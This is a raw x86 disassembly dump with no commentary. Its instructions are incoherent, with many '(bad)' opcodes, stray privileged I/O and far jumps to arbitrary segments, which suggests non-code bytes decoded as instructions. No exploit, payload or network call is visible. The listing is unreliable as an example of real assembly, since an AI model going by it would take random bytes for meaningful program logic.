  4277d3:	cmp    cl,BYTE PTR [ecx+0x4800ec77]
  4277d9:	aaa    
  4277da:	jne    0x4277f3
  4277dc:	pop    ecx
  4277dd:	loope  0x427819
  4277df:	inc    esi
  4277e0:	cwde   
  4277e1:	cmp    DWORD PTR [edx],ebx
  4277e3:	and    edx,DWORD PTR [ebx]
  4277e5:	lea    eax,[esi]
  4277e7:	mov    al,ds:0x1329a9a
  4277ec:	mov    esi,0x49cc828b
  4277f1:	and    DWORD PTR [eax+0xd],0xd791b8db
  4277f8:	hlt    
  4277f9:	repz adc DWORD PTR [edi],esi
  4277fc:	pop    esi
  4277fd:	sbb    eax,0x94499899
  427802:	jb     0x4277f5
  427804:	dec    edi
  427805:	mov    dl,0x25
  427807:	jo     0x4277a3
  427809:	jmp    edx
  42780b:	outs   dx,DWORD PTR ds:[esi]
  42780c:	lea    ecx,[ebx]
  42780e:	inc    ecx
  42780f:	mov    ah,0x0
	...
  427871:	add    BYTE PTR [eax],al
  427873:	add    BYTE PTR [edx],bl
  427875:	mov    cl,BYTE PTR [ebx]
  427877:	inc    ebp
  427878:	fwait
  427879:	lds    ebx,FWORD PTR [esi-0x21]
  42787c:	jo     0x4278e3
  42787e:	fldl2e 
  427880:	(bad)  
  427881:	sahf   
  427882:	jle    0x427880
  427884:	and    BYTE PTR [esi+0x1040001],ah
  42788a:	add    BYTE PTR [eax],al
  42788c:	(bad)  
  42788d:	mov    bh,0x7d
  42788f:	or     esp,DWORD PTR [ecx-0x12]
  427892:	(bad)  [ebx-0x43]
  427895:	sbb    BYTE PTR [ecx+0x6d],al
  427898:	outs   dx,BYTE PTR ds:[esi]
  427899:	mov    edx,0x5f11be57
  42789e:	mov    esp,0xbf4f0c8d
  4278a3:	push   ebp
  4278a4:	lods   eax,DWORD PTR ds:[esi]
  4278a5:	push   es
  4278a6:	repnz faddp st(2),st
  4278a9:	scas   eax,DWORD PTR es:[edi]
  4278aa:	enter  0xeece,0x67
  4278ae:	jnp    0x427919
  4278b0:	push   ss
  4278b1:	outs   dx,DWORD PTR ds:[esi]
  4278b2:	inc    ecx
  4278b3:	push   esi
  4278b4:	shr    DWORD PTR [edi],cl
  4278b6:	inc    ebp
  4278b7:	retf   
  4278b8:	jmp    0x2c92cdf3
  4278bd:	xchg   ecx,ecx
  4278bf:	jge    0x4278e1
  4278c1:	sub    eax,0x37063c04
  4278c6:	xor    al,0x2b
  4278c8:	loopne 0x427900
  4278ca:	dec    ecx
  4278cb:	xchg   ebp,eax
  4278cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278cd:	sub    eax,0xce855724
  4278d2:	jge    0x42791f
  4278d4:	ds gs jmp 0x9494dcce
  4278db:	stos   BYTE PTR es:[edi],al
  4278dc:	cmp    al,0xc0
  4278de:	mov    ds:0xd1dce440,al
  4278e3:	push   edx
  4278e4:	fcomp  QWORD PTR [ecx]
  4278e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278e7:	sub    al,0x2a
  4278e9:	lds    esp,FWORD PTR [eax-0x375b7da0]
  4278ef:	scas   al,BYTE PTR es:[edi]
  4278f0:	pop    ds
  4278f1:	scas   al,BYTE PTR es:[edi]
  4278f2:	loop   0x4278a2
  4278f4:	pop    ebp
  4278f5:	ins    BYTE PTR es:[edi],dx
  4278f6:	fldenv [esi+0x75]
  4278f9:	jnp    0x427966
  4278fb:	cli    
  4278fc:	xor    BYTE PTR [esi+0x1fbd0e61],bh
  427902:	ins    BYTE PTR es:[edi],dx
  427903:	xchg   edx,eax
  427904:	inc    esi
  427905:	hlt    
  427906:	add    ebp,DWORD PTR [esi+esi*4+0x73]
  42790a:	mov    edx,0xe1bb9c44
  42790f:	pop    ecx
  427910:	cli    
  427911:	dec    eax
  427912:	sbb    BYTE PTR [edi+esi*1],0x2
  427916:	rcl    esi,cl
  427918:	mov    cl,0xd8
  42791a:	mov    al,bh
  42791c:	jno    0x427924
  42791e:	pop    ebp
  42791f:	xchg   ecx,eax
  427920:	stc    
  427921:	mov    dl,0x58
  427923:	scas   al,BYTE PTR es:[edi]
  427924:	mov    edx,0xea3aeacf
  427929:	pop    esi
  42792a:	pushf  
  42792b:	inc    ebp
  42792c:	inc    eax
  42792d:	aaa    
  42792e:	sub    DWORD PTR [eax+0x70],ebp
  427931:	sub    BYTE PTR [ecx+ebx*1+0x59],bh
  427935:	outs   dx,BYTE PTR ds:[esi]
  427936:	pop    esp
  427937:	mov    bh,BYTE PTR [ebp-0x17]
  42793a:	mov    ah,BYTE PTR [eax-0x54]
  42793d:	popf   
  42793e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42793f:	xor    eax,0xd4dc37d1
  427944:	in     al,dx
  427945:	jne    0x42790a
  427947:	mov    edi,0x9091c944
  42794c:	rcr    DWORD PTR [ecx],0xa7
  42794f:	dec    edx
  427950:	js     0x42794b
  427952:	and    eax,0xb119cc10
  427957:	pop    ebp
  427958:	xchg   ebx,eax
  427959:	jge    0x4278f9
  42795b:	cmp    cl,bl
  42795d:	not    ebp
  42795f:	xor    DWORD PTR [edx-0x65],esi
  427962:	sahf   
  427963:	pushf  
  427964:	cld    
  427965:	mov    DWORD PTR [edi],ebp
  427967:	inc    esi
  427968:	sbb    al,0x5d
  42796a:	pop    edi
  42796b:	dec    edx
  42796c:	pusha  
  42796d:	popf   
  42796e:	mov    ch,0xc9
  427970:	push   edx
  427971:	xchg   esp,eax
  427972:	and    al,BYTE PTR [ebx+0x4d]
  427975:	xchg   ebp,eax
  427976:	sub    DWORD PTR [esi+0xe],ebp
  427979:	add    al,0x3d
  42797b:	xor    cl,BYTE PTR [edi+ebp*1]
  42797e:	scas   eax,DWORD PTR es:[edi]
  42797f:	outs   dx,BYTE PTR ds:[esi]
  427980:	ja     0x42796e
  427982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427983:	or     al,0x0
  427985:	rcr    BYTE PTR [ebx+0xd237323],1
  42798b:	push   esi
  42798c:	cmp    al,0xe9
  42798e:	dec    edx
  42798f:	outs   dx,DWORD PTR ds:[esi]
	...
  4279f4:	call   0xdea3:0xffa3ffdd
  4279fb:	std    
  4279fc:	inc    edx
  4279fd:	jne    0x4279d7
  4279ff:	sub    DWORD PTR [ebp+0x22],0xffffff91
  427a03:	dec    ecx
  427a04:	and    al,0xa7
  427a06:	add    DWORD PTR [eax],eax
  427a08:	add    al,0x1
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	add    al,0x19
  427a0e:	xor    bh,ch
  427a10:	inc    edi
  427a11:	adc    BYTE PTR [edi+0x3],cl
  427a14:	ins    BYTE PTR es:[edi],dx
  427a15:	stos   DWORD PTR es:[edi],eax
  427a16:	sub    eax,0x935e99d6
  427a1b:	and    ebp,DWORD PTR [eax]
  427a1d:	ficom  DWORD PTR [edx-0x775e1e86]
  427a23:	arpl   WORD PTR [eax-0x6fe5152b],si
  427a29:	and    eax,0x6e69bf66
  427a2e:	push   ebx
  427a2f:	push   eax
  427a30:	imul   ebx,edx,0xeeb00d60
  427a36:	in     eax,dx
  427a37:	xchg   esi,eax
  427a38:	jb     0x427a5e
  427a3a:	push   ecx
  427a3b:	mov    al,0x4d
  427a3d:	sub    al,0xef
  427a3f:	adc    BYTE PTR [eax-0x64],al
  427a42:	jle    0x4279e2
  427a44:	test   al,0x58
  427a46:	or     DWORD PTR [edx],edi
  427a48:	cli    
  427a49:	push   esi
  427a4a:	fimul  DWORD PTR [ebx+0x3b]
  427a4d:	sti    
  427a4e:	mov    dl,0xfd
  427a50:	mov    al,dl
  427a52:	cdq    
  427a53:	retf   0xf676
  427a56:	and    ebx,edx
  427a58:	lahf   
  427a59:	jne    0x4279f1
  427a5b:	leave  
  427a5c:	xor    BYTE PTR [edi],al
  427a5e:	adc    ecx,DWORD PTR [ebp+edx*8+0x7065d97]
  427a65:	jecxz  0x427a60
  427a67:	lahf   
  427a68:	cmp    al,0x68
  427a6a:	loop   0x4279fb
  427a6c:	adc    cl,bh
  427a6e:	bound  eax,QWORD PTR [ebx+0x6e06496f]
  427a74:	scas   al,BYTE PTR es:[edi]
  427a75:	mov    edx,0xa55011ed
  427a7a:	mov    al,0x8b
  427a7c:	adc    edx,edi
  427a7e:	call   0x6db0d768
  427a83:	inc    edx
  427a84:	and    BYTE PTR [eax+0x2e],ah
  427a87:	repnz (bad) 
  427a89:	pushf  
  427a8a:	iret   
  427a8b:	mov    ds:0x9eb84f28,al
  427a90:	cwde   
  427a91:	sub    al,0x4f
  427a93:	jae    0x427a89
  427a95:	cwde   
  427a96:	fisttp WORD PTR [ecx]
  427a98:	stos   DWORD PTR es:[edi],eax
  427a99:	jmp    0xc0c5:0xf1b27dfc
  427aa0:	xlat   BYTE PTR ds:[ebx]
  427aa1:	call   0x1bb0:0x314a6615
  427aa8:	sub    al,0xe9
  427aaa:	dec    ecx
  427aab:	mov    eax,ds:0x87ce392f
  427ab0:	das    
  427ab1:	mov    dl,0x6b
  427ab3:	retf   
  427ab4:	icebp  
  427ab5:	into   
  427ab6:	xor    DWORD PTR [ebp+ebp*8+0x67],esi
  427aba:	or     ebp,DWORD PTR [eax]
  427abc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427abd:	mov    fs,WORD PTR [edx-0x18]
  427ac0:	inc    ecx
  427ac1:	inc    eax
  427ac2:	pop    es
  427ac3:	(bad)  
  427ac4:	dec    edx
  427ac5:	dec    edi
  427ac6:	jecxz  0x427b31
  427ac8:	aas    
  427ac9:	add    al,0xaf
  427acb:	jno    0x427b1c
  427acd:	push   eax
  427ace:	je     0x427a6a
  427ad0:	repnz pop ebp
  427ad2:	cmp    ah,dh
  427ad4:	int    0xf8
  427ad6:	mov    esp,0x803c94fc
  427adb:	mov    bh,0x7
  427add:	mov    WORD PTR [ebx],?
  427adf:	in     al,dx
  427ae0:	test   edx,esp
  427ae2:	ret    
  427ae3:	push   esp
  427ae4:	mov    cl,0x55
  427ae6:	clc    
  427ae7:	cli    
  427ae8:	out    0x27,al
  427aea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427aeb:	add    eax,edx
  427aed:	mov    bl,BYTE PTR [esi]
  427aef:	mov    ebp,0x1cdbb0ae
  427af4:	jmp    0x427b41
  427af6:	add    dh,0xd0
  427af9:	push   ebx
  427afa:	int    0xc5
  427afc:	sub    ah,0x4a
  427aff:	fdiv   DWORD PTR [edx]
  427b01:	mov    bh,0x7f
  427b03:	inc    ebx
  427b04:	(bad)  
  427b05:	pushf  
  427b06:	dec    ecx
  427b07:	cwde   
  427b08:	and    BYTE PTR [eax-0x77],dl
  427b0b:	cmp    BYTE PTR [ebp+0x3a],al
  427b0e:	lods   al,BYTE PTR ds:[esi]
  427b0f:	push   0x0
	...
  427b71:	add    BYTE PTR [eax],al
  427b73:	add    dl,cl
  427b75:	mov    edx,DWORD PTR [edx+0x7b]
  427b78:	push   ebx
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	not    BYTE PTR [esi+0x2807d9c8]
  427b85:	test   al,0x1
  427b87:	add    BYTE PTR [ecx+eax*1],al
  427b8a:	add    BYTE PTR [eax],al
  427b8c:	shr    DWORD PTR [esi-0x66],0xbf
  427b90:	add    ebx,ebp
  427b92:	add    al,0xdb
  427b94:	std    
  427b95:	sbb    DWORD PTR [ecx+edx*4-0x6ffb13b3],0x7b
  427b9d:	and    eax,0xac109fa7
  427ba2:	push   edi
  427ba3:	xor    DWORD PTR [edx+0x5],ebp
  427ba6:	sub    al,0xbf
  427ba8:	xchg   esp,eax
  427ba9:	or     bl,BYTE PTR [eax+0x5c963d9]
  427baf:	jmp    0x7880298b
  427bb4:	stos   DWORD PTR es:[edi],eax
  427bb5:	inc    eax
  427bb6:	mov    ds:0x89c3f8bd,al
  427bbb:	adc    BYTE PTR [bp+di],ch
  427bbe:	adc    al,0x9c
  427bc0:	adc    al,0x8d
  427bc2:	push   esp
  427bc3:	fwait
  427bc4:	sub    DWORD PTR [eax-0x33],eax
  427bc7:	leave  
  427bc8:	dec    edx
  427bc9:	fwait
  427bca:	test   DWORD PTR [ebp+0x7c],ebx
  427bcd:	mul    DWORD PTR [ebx+0xa400314]
  427bd3:	sti    
  427bd4:	mov    edx,0x195b4ef7
  427bd9:	sbb    al,0x44
  427bdb:	jb     0x427c1c
  427bdd:	mov    esi,0x1a43e5ff
  427be2:	sbb    ebp,DWORD PTR [edx-0x41]
  427be5:	cmp    esp,DWORD PTR [eax+0x9]
  427be8:	mov    DWORD PTR [ebp+0x68da8b3],ebx
  427bee:	lock rol BYTE PTR [eax-0x4cdde115],1
  427bf5:	xchg   DWORD PTR [ebp-0x72],edx
  427bf8:	inc    ecx
  427bf9:	sbb    eax,DWORD PTR [ebp-0x1935ef4]
  427bff:	add    al,0xcf
  427c01:	sub    BYTE PTR [edi-0xad360f1],ch
  427c07:	std    
  427c08:	ret    
  427c09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c0a:	cmp    ecx,DWORD PTR [ecx]
  427c0c:	inc    ebp
  427c0d:	mov    ds:0xa11a4298,al
  427c12:	int3   
  427c13:	jbe    0x427c09
  427c15:	lss    edx,FWORD PTR [edx]
  427c18:	fnstcw WORD PTR [eax]
  427c1a:	adc    BYTE PTR [ebx+edi*8+0x7b43ee3],0x8
  427c22:	push   edi
  427c23:	in     al,dx
  427c24:	push   0x1b
  427c26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c27:	mov    edx,DWORD PTR [esp+ecx*8-0x1d6f1a0e]
  427c2e:	or     DWORD PTR [edx-0x43],0xffffffe5
  427c32:	xchg   esp,eax
  427c33:	lock daa 
  427c35:	fst    DWORD PTR [edi+0x2bbba1f7]
  427c3b:	sbb    eax,0x316f24ae
  427c40:	dec    edx
  427c41:	addr16 mov ebp,0x86b96b7c
  427c47:	pop    ds
  427c48:	cmp    eax,DWORD PTR [ebp-0x6a4d7311]
  427c4e:	into   
  427c4f:	add    DWORD PTR [eax+0x49ef1896],edi
  427c55:	adc    ebx,DWORD PTR [ecx]
  427c57:	int    0xaf
  427c59:	mov    ebx,0xcabef1d
  427c5e:	pop    edi
  427c5f:	sub    DWORD PTR [esi+0x53],0x95965e05
  427c66:	and    BYTE PTR [ebx+0x5d],dh
  427c69:	sbb    dl,BYTE PTR [edx]
  427c6b:	aam    0xa9
  427c6d:	dec    ebp
  427c6e:	loopne 0x427ce4
  427c70:	fidiv  WORD PTR [edx+0x1ac19436]
  427c76:	out    dx,eax
  427c77:	sub    BYTE PTR [ecx],ch
  427c79:	stc    
  427c7a:	mov    ebp,0xc33d1014
  427c7f:	cs xchg edi,eax
  427c81:	(bad)  
  427c83:	sbb    DWORD PTR [edx+edi*8-0x3b],0xc199c197
  427c8b:	push   ss
  427c8c:	jp     0x427c12
  427c8e:	jb     0x427cdf
	...
  427cf4:	mov    ds:0xf343b050,eax
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0xc9b45d44,ebx
  427d02:	pop    ebx
  427d03:	push   ecx
  427d04:	sub    al,0xa9
  427d06:	add    DWORD PTR [eax],eax
  427d08:	add    al,0x1
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	enter  0xf533,0x5e
  427d10:	retf   
  427d11:	push   edx
  427d12:	dec    esi
  427d13:	in     eax,0x50
  427d15:	sbb    dh,BYTE PTR [ebx]
  427d17:	mov    eax,0xd4f2a452
  427d1c:	mov    ds:0xcf980f4a,eax
  427d21:	xor    al,dl
  427d23:	leave  
  427d24:	cmc    
  427d25:	mov    al,0xa9
  427d27:	sahf   
  427d28:	mov    ebp,0x7c0717ff
  427d2d:	cmp    eax,0x5478ea79
  427d32:	mov    esi,0x7576bffe
  427d37:	in     al,dx
  427d38:	int    0xa6
  427d3a:	mov    gs,WORD PTR [edi+0x41323864]
  427d40:	rol    DWORD PTR [ecx+esi*4-0x15],0x78
  427d45:	sar    ch,cl
  427d47:	mov    dh,0xca
  427d49:	imul   esp,DWORD PTR [eax+0x28fd1194],0x799c1bf8
  427d53:	sti    
  427d54:	pop    es
  427d55:	jb     0x427d5e
  427d57:	call   0xa4e5:0x2df29068
  427d5e:	out    dx,al
  427d5f:	push   cs
  427d60:	inc    edx
  427d61:	pop    ebx
  427d62:	mov    eax,ds:0x794d31b0
  427d67:	sbb    edi,ebp
  427d69:	mov    esp,cs
  427d6b:	sbb    dh,BYTE PTR [esi+eax*1]
  427d6e:	jmp    0x9da5:0x63f0f71a
  427d75:	imul   ebx,DWORD PTR [edi-0x2d05d3c2],0x3
  427d7c:	sub    BYTE PTR [ecx+0x4c7add13],cl
  427d82:	add    BYTE PTR [edx+ecx*1+0x46fa5e4f],0xce
  427d8a:	les    eax,FWORD PTR [ebx+ebx*4+0x1d552128]
  427d91:	xor    al,0xf3
  427d93:	(bad)  
  427d94:	xor    ebx,DWORD PTR [edx+0x79]
  427d97:	test   BYTE PTR [ebx],dh
  427d99:	push   ds
  427d9a:	test   al,0x4e
  427d9c:	test   eax,0x361644bd
  427da1:	ja     0x427d3b
  427da3:	das    
  427da4:	stos   DWORD PTR es:[edi],eax
  427da5:	hlt    
  427da6:	mov    al,ds:0x6659e2fe
  427dab:	jmp    0x7b221812
  427db0:	sbb    cl,BYTE PTR [ebx-0x43c65b37]
  427db6:	sub    esi,edi
  427db8:	cli    
  427db9:	mov    eax,ds:0xa16e576
  427dbe:	mov    ds:0xb655f635,eax
  427dc3:	add    eax,0xc6a8d9f2
  427dc8:	test   eax,0x9b45a1e4
  427dcd:	hlt    
  427dce:	popa   
  427dcf:	cld    
  427dd0:	ficom  DWORD PTR [ecx]
  427dd2:	pop    es
  427dd3:	lods   eax,DWORD PTR ds:[esi]
  427dd4:	mov    ecx,0xd307e94c
  427dd9:	jbe    0x427de3
  427ddb:	mov    bh,0xe4
  427ddd:	rol    DWORD PTR [edx+0x6c],0xd4
  427de1:	out    0xc7,al
  427de3:	sbb    al,0x54
  427de5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427de6:	sahf   
  427de7:	sub    DWORD PTR [edx-0x6880f8d5],0xb5d3dd92
  427df1:	mov    edi,0xadae9685
  427df6:	pop    ebx
  427df7:	inc    esp
  427df8:	ror    DWORD PTR es:[edx],cl
  427dfb:	xor    esi,DWORD PTR [edx-0x5d9eb931]
  427e01:	mov    al,0x42
  427e03:	mov    ch,0x83
  427e05:	mov    edx,0x8aab2856
  427e0a:	nop
  427e0b:	pop    ebx
  427e0c:	inc    edx
  427e0d:	leave  
  427e0e:	mov    esp,0x11
	...
  427e73:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	pop    eax
  427e81:	jg     0x427e24
  427e83:	xor    BYTE PTR [eax],dh
  427e85:	stos   BYTE PTR es:[edi],al
  427e86:	add    DWORD PTR [eax],eax
  427e88:	add    al,0x1
  427e8a:	add    BYTE PTR [eax],al
  427e8c:	xchg   DWORD PTR [ebx],ebx
  427e8e:	pop    ecx
  427e8f:	pop    ebp
  427e90:	nop
  427e91:	xchg   edx,esp
  427e93:	out    dx,al
  427e94:	in     al,dx
  427e95:	mov    ebx,edx
  427e97:	mov    al,0x6
  427e99:	mov    ebp,0x9197f50f
  427e9e:	fcmovb st,st(2)
  427ea0:	pop    edx
  427ea1:	jmp    0xdd6d4deb
  427ea6:	sub    al,0x84
  427ea8:	scas   al,BYTE PTR es:[edi]
  427ea9:	xlat   BYTE PTR ds:[ebx]
  427eaa:	(bad)  
  427eac:	in     eax,0xef
  427eae:	jp     0x427ece
  427eb0:	sbb    ah,bh
  427eb2:	pop    edi
  427eb3:	push   eax
  427eb4:	(bad)  
  427eb5:	hlt    
  427eb6:	jmp    0x89e8:0x956860c4
  427ebd:	(bad)  
  427ebe:	les    esi,FWORD PTR [edi-0x34]
  427ec1:	dec    ecx
  427ec2:	mov    esp,0xd5e23ffd
  427ec7:	jno    0x427e67
  427ec9:	and    al,0x2a
  427ecb:	aam    0x75
  427ecd:	push   eax
  427ece:	mov    ch,0xef
  427ed0:	sbb    esp,DWORD PTR [esi]
  427ed2:	sbb    DWORD PTR [ecx+0x518315e4],edi
  427ed8:	inc    ebp
  427ed9:	dec    ebp
  427eda:	jne    0x427e80
  427edc:	mov    ds:0xfb5f3f1,al
  427ee1:	inc    eax
  427ee2:	add    al,0xaa
  427ee4:	cmp    esi,DWORD PTR [ecx]
  427ee6:	ds (bad) 
  427ee9:	jo     0x427f5f
  427eeb:	pop    ebx
  427eec:	adc    al,0x1e
  427eee:	jmp    0x427ee3
  427ef0:	mov    ch,0x4d
  427ef2:	and    BYTE PTR [eax+0x7d],0x5
  427ef6:	das    
  427ef7:	mov    edx,0x5cee842d
  427efc:	outs   dx,BYTE PTR ds:[esi]
  427efd:	std    
  427efe:	aaa    
  427eff:	pop    edi
  427f00:	ret    
  427f01:	push   ebx
  427f02:	or     dh,BYTE PTR [ebx+0x432e7244]
  427f08:	ret    0x482e
  427f0b:	mov    ah,0xd3
  427f0d:	jo     0x427f5d
  427f0f:	test   al,0xa3
  427f11:	pop    esi
  427f12:	out    dx,al
  427f13:	in     al,0x46
  427f15:	or     eax,0x6df1a12d
  427f1a:	add    BYTE PTR [ecx-0x303bad9f],al
  427f20:	aam    0xfc
  427f22:	sub    BYTE PTR [ebx+ebx*8+0x2c245aa7],bh
  427f29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427f2a:	fcomp  QWORD PTR [ecx+0xbed61e0]
  427f30:	jae    0x427fb1
  427f32:	mov    bh,0x4f
  427f34:	jae    0x427f45
  427f36:	cld    
  427f37:	imul   edx,DWORD PTR [ebp+0x5a],0x1d
  427f3b:	add    eax,0x4f7107f
  427f40:	xor    DWORD PTR [esi+0x5e],0x4bd9d89f
  427f47:	jmp    0x427fa7
  427f49:	in     eax,dx
  427f4a:	adc    DWORD PTR [ebx+0x30],ebx
  427f4d:	mov    ebp,0xb4aee135
  427f52:	lds    edx,FWORD PTR [ebx-0x55]
  427f55:	jb     0x427ef9
  427f57:	adc    eax,0x710935d9
  427f5c:	ror    cl,1
  427f5e:	pop    eax
  427f5f:	call   0xff928d9a
  427f64:	in     eax,0x18
  427f66:	add    dl,BYTE PTR [eax+0x64]
  427f69:	nop
  427f6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f6b:	mov    edx,0x734f94d3
  427f70:	jl     0x427f18
  427f72:	test   eax,0xfafaf012
  427f77:	retf   0x5f46
  427f7a:	lods   eax,DWORD PTR ds:[esi]
  427f7b:	call   0x9ca7:0xc8577244
  427f82:	mov    ebx,0xac048346
  427f87:	jb     0x427f92
  427f89:	xor    DWORD PTR [ebx],edx
  427f8b:	xor    eax,0xfb7debb0
	...
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	test   DWORD PTR [eax-0x54cb2d78],0x1040001
  42800a:	add    BYTE PTR [eax],al
  42800c:	iret   
  42800d:	adc    BYTE PTR [ecx-0x725013db],0xe7
  428014:	push   eax
  428015:	cmp    ah,BYTE PTR [edx+eax*8-0x1f]
  428019:	dec    BYTE PTR [edi+0x11]
  42801c:	(bad)  
  42801d:	pop    edi
  42801e:	cdq    
  42801f:	or     esp,ebp
  428021:	loope  0x428092
  428023:	push   es
  428024:	es xchg ebp,eax
  428026:	dec    ecx
  428027:	sub    al,0xef
  428029:	mov    ebx,0xd9637a18
  42802e:	push   esi
  42802f:	shl    dl,0xec
  428032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428033:	(bad)  [eax]
  428035:	dec    eax
  428036:	dec    ebp
  428037:	lock jmp 0x1087:0x372be6e9
  42803f:	cmc    
  428040:	inc    esp
  428041:	sub    eax,0x703e6496
  428046:	out    0xb7,al
  428048:	into   
  428049:	scas   eax,DWORD PTR es:[edi]
  42804a:	imul   DWORD PTR [ebx+0x58]
  42804d:	cld    
  42804e:	mov    ds,WORD PTR [ecx]
  428050:	jmp    0x6a2b05b1
  428055:	ins    DWORD PTR es:[edi],dx
  428056:	or     edx,ebx
  428058:	xchg   edi,eax
  428059:	xchg   edi,eax
  42805a:	add    DWORD PTR [eax],ecx
  42805c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42805d:	stos   DWORD PTR es:[edi],eax
  42805e:	mov    ebx,0xcf2bf46f
  428063:	lods   al,BYTE PTR ds:[esi]
  428064:	mov    dl,0x1f
  428066:	inc    ebx
  428067:	jns    0x42800f
  428069:	aas    
  42806a:	pop    esp
  42806b:	sub    eax,0x8ffbf691
  428070:	cwde   
  428071:	xchg   esp,eax
  428072:	jmp    0x12f207c3
  428077:	xor    BYTE PTR [edi],ch
  428079:	bound  ebx,QWORD PTR [ecx-0x78e351e7]
  42807f:	mov    dl,0x82
  428081:	rol    DWORD PTR ds:0xa48e4d85,cl
  428087:	in     eax,dx
  428088:	or     eax,0x48a8b17d
  42808d:	mov    bl,0x52
  42808f:	mov    esp,0xc34941e
  428094:	je     0x4280f6
  428096:	jge    0x4280f1
  428098:	sbb    eax,0xe90ccdc3
  42809d:	sti    
  42809e:	mov    DWORD PTR [ecx],esp
  4280a0:	stos   BYTE PTR es:[edi],al
  4280a1:	adc    cl,BYTE PTR ds:0xedd6647f
  4280a7:	pop    ebp
  4280a8:	jecxz  0x4280a9
  4280aa:	scas   al,BYTE PTR es:[edi]
  4280ab:	or     al,0xae
  4280ad:	ja     0x42807e
  4280af:	adc    BYTE PTR [esi-0x6e],0xe7
  4280b3:	icebp  
  4280b4:	(bad)  
  4280b5:	dec    ecx
  4280b6:	mov    ecx,0xe9435054
  4280bb:	dec    eax
  4280bc:	jmp    0xf7e9188b
  4280c1:	(bad)  
  4280c2:	loop   0x4280be
  4280c4:	pop    esp
  4280c5:	adc    al,0xa8
  4280c7:	in     eax,0xe3
  4280c9:	jbe    0x428109
  4280cb:	ss pop ebx
  4280cd:	mov    al,0x18
  4280cf:	sbb    ebp,DWORD PTR [ecx-0x4e1b378]
  4280d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280d6:	(bad)  
  4280d7:	lock xchg ebp,eax
  4280d9:	test   DWORD PTR [esi+eax*4+0x22f7c89c],0xf7b6961d
  4280e4:	scas   al,BYTE PTR es:[edi]
  4280e5:	pop    ebp
  4280e6:	mov    esi,ebx
  4280e8:	loopne 0x42807d
  4280ea:	adc    DWORD PTR [esp+edi*8],0x37
  4280ee:	das    
  4280ef:	mov    esp,0xfbc270b1
  4280f4:	jp     0x42814c
  4280f6:	adc    dl,ch
  4280f8:	fcomp  DWORD PTR [edx]
  4280fa:	jge    0x428174
  4280fc:	retf   0xf8b5
  4280ff:	(bad)  
  428100:	(bad)  
  428102:	jmp    0x4280e5
  428104:	jae    0x4280c7
  428106:	push   ecx
  428107:	popa   
  428108:	sub    DWORD PTR [edi+esi*8+0x7c7dbafe],edi
  42810f:	add    BYTE PTR cs:[eax],al
	...
  428172:	add    BYTE PTR [eax],al
  428174:	fucomip st,st(6)
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	aad    0xf9
  428182:	(bad)  
  428183:	sub    al,0x38
  428185:	lods   al,BYTE PTR ds:[esi]
  428186:	add    DWORD PTR [eax],eax
  428188:	add    al,0x1
  42818a:	add    BYTE PTR [eax],al
  42818c:	mov    eax,0x4e01c657
  428191:	test   al,0x5
  428193:	aas    
  428194:	cmp    al,0x90
  428196:	inc    esp
  428197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428198:	repz inc ebp
  42819a:	aad    0x39
  42819c:	(bad)  
  42819d:	push   eax
  42819e:	mov    cl,0x2f
  4281a0:	outs   dx,DWORD PTR ds:[esi]
  4281a1:	loop   0x428208
  4281a3:	inc    eax
  4281a4:	xchg   esi,edx
  4281a6:	(bad)  
  4281a7:	dec    esp
  4281a8:	mov    ah,0xe4
  4281aa:	aaa    
  4281ab:	mov    WORD PTR [edx-0x61],es
  4281ae:	call   0x2e712fa9
  4281b3:	pop    ebp
  4281b4:	and    edx,DWORD PTR [esi-0x78a97dc9]
  4281ba:	cli    
  4281bb:	mov    BYTE PTR [ebp+0x428a3346],ah
  4281c1:	mov    dh,0x1e
  4281c3:	push   ds
  4281c4:	fsub   QWORD PTR [edx-0x105ea16b]
  4281ca:	enter  0xf62b,0xc4
  4281ce:	mov    bh,0x2b
  4281d0:	pushf  
  4281d1:	aad    0x2e
  4281d3:	(bad)  
  4281d4:	retf   
  4281d5:	xchg   ebx,eax
  4281d6:	(bad)  
  4281d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281d8:	or     DWORD PTR [edx],esp
  4281da:	shl    DWORD PTR [ecx],1
  4281dc:	or     ebx,edx
  4281de:	popf   
  4281df:	repnz scas al,BYTE PTR es:[edi]
  4281e1:	mov    BYTE PTR [ecx+0x59e6fb],al
  4281e7:	dec    edx
  4281e8:	ins    DWORD PTR es:[edi],dx
  4281e9:	fs pop ebx
  4281eb:	ins    DWORD PTR es:[edi],dx
  4281ec:	xchg   esp,eax
  4281ed:	inc    edx
  4281ee:	lahf   
  4281ef:	repnz and ah,0xcd
  4281f3:	cdq    
  4281f4:	loopne 0x428207
  4281f6:	push   edx
  4281f7:	mov    esi,DWORD PTR [ebp-0x35]
  4281fa:	sbb    edi,edx
